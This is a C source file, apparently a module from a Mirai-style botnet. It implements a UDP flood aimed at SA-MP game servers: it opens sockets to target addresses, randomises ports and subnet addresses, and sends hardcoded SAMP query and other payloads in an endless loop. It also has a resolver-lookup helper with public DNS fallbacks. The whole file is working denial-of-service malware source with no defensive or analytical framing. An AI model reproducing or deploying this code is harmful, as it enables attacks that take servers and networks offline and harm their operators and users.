#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>

#include <stdint.h>
#include <poll.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/checksum.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/table.h"
#include "headers/protocol.h"

static unsigned long int Q[4096], c = 362436;

static ipv4_t get_dns_resolver(void);

void attack_game_samp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("Is UDP FLOOD OPTIMIZE FOR [ PACKET SAMP ]\n");
#endif
    int i;
    int *fds = calloc(targs_len, sizeof(int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    struct sockaddr_in bind_addr = {0};

    char Asamp[11] = "\x53\x41\x4D\x50\x67\xE6\x79\x5F\x13\xA1\x63";
    char Gsamp[15] = "\x53\x41\x4D\x50\x67\xE6\x79\x5F\x13\xA1\x70\xE5\xE2\x96\xAB";
    char Wsamp[15] = "\x53\x41\x4D\x50\x67\xE6\x79\x5F\x13\xA1\x70\x8F\xAB\x9B\xD3";
    char fowsamp[4] = "\x08\x1E\x77\xDA";
    char fiberhome[6] = "\x88\x27\x8A\xC7\xD8\x99";
    char IGBIT[48] = "\x0A\x27\xD8\x11\x4D\xFD\x0E\x7A\x1B\x62\x6A\x8B\xF4\x6A\xE1\xF4\x59\x29\x26\x4C\x97\x59\xCF\x59\xE1\xBC\xE1\x61\xCF\x7F\x26\xB9\x6A\x59\xD2\x62\xD2\x7F\xD2\x62\x3A\x62\x11\xB9\xC7\xB9\xE1\x61";
    char *payloads[] = {Asamp, Gsamp, Wsamp, fowsamp, fiberhome, IGBIT};
    uint16_t payload_sizes[] = {sizeof(Asamp), sizeof(Gsamp), sizeof(Wsamp), sizeof(fowsamp), sizeof(fiberhome), sizeof(IGBIT)};

    if (sport == 0xffff) {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

#ifdef DEBUG
    printf("after args\n");
#endif

    for (i = 0; i < targs_len; i++)
    {
        if (dport == 0xffff) {
            targs[i].sock_addr.sin_port = rand_next();
        } else {
            targs[i].sock_addr.sin_port = htons(dport);
        }

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        if (targs[i].netmask < 32) {
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        }

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

#ifdef DEBUG
    printf("after setup\n");
#endif
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int rand_index = rand() % 6;
            char *selected_payload = payloads[rand_index];
            uint16_t selected_payload_size = payload_sizes[rand_index];
#ifdef DEBUG
            errno = 0;
            if (send(fds[i], selected_payload, selected_payload_size, MSG_NOSIGNAL) == -1)
            {
                printf("send failed: %d\n", errno);
            } else {
                printf(".\n");
            }
#else
            send(fds[i], selected_payload, selected_payload_size, MSG_NOSIGNAL);
#endif
        }

#ifdef DEBUG
        break;
        if (errno != 0)
            printf("errno = %d\n", errno);
#endif
    }
}

static ipv4_t get_dns_resolver(void)
{
    int fd;

    table_unlock_val(TABLE_ATK_RESOLVER);
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];

        ret = read(fd, resolvbuf, sizeof (resolvbuf));
        close(fd);
        table_unlock_val(TABLE_ATK_NSERV);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
        table_lock_val(TABLE_ATK_NSERV);
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;

            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];

                // Skip leading whitespace
                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }

                // End if c is not either a dot or a number
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }

            if (found)
            {
#ifdef DEBUG
                printf("Found local resolver: '%s'\n", ipbuf);
#endif
                return inet_addr(ipbuf);
            }
        }
    }

    switch (rand_next() % 4)
    {
    case 0:
        return INET_ADDR(8,8,8,8);
    case 1:
        return INET_ADDR(74,82,42,42);
    case 2:
        return INET_ADDR(64,6,64,6);
    case 3:
        return INET_ADDR(4,2,2,2);
    }
}
